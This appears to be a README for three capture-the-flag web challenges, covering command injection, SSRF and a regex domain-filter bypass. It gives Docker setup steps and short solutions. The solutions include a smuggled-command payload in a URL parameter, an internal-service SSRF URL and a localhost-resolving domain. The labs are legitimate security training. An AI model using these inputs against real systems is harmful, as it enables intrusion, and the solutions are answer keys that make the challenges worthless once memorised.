# Command Injection
## Setup
`sudo docker build -t code_injection . && sudo docker run code_injection`
## Description
- Difficulty: **hard**
- Topics: Code Injection
- Inspiration: Hack The Box Academy, Code Injection module, Skills Assessment section

## Solution
1. Access the website on port `5000`
2. Build a request: `/diagnose?ip_address=8.8.8.8%0Axargs${IFS}echo${IFS}<flag.txt`
3. Find a flag

# SSRF
## Setup
`sudo docker-compose build & sudo docker-compose up -d`

To stop:
`sudo docker-compose down -v --remove_orphans`
## Description
- Difficulty: **medium**
- Topics: SSRF
- Inspiration: Hack The Box Academy, Server-Side Attacks, SSRF sections
## Solution
1. Access the public website on port `5000`
2. Put `http://internal_admin:7000/internal/admin/flag` into the field
3. Get a flag

# Easy
## Setup
`sudo docker build -t easy . && sudo docker run easy`
## Description
- Difficulty: **easy**
- Topics: Creativity, bypass regex domain filter to point into localhost
- Inspiration: fun

## Solution
1. Access the website on port `5000`
2. Put `localtest.me` into the field
3. Get a flag

## Resources:
- https://gist.github.com/tinogomes/c425aa2a56d289f16a1f4fcb8a65ea65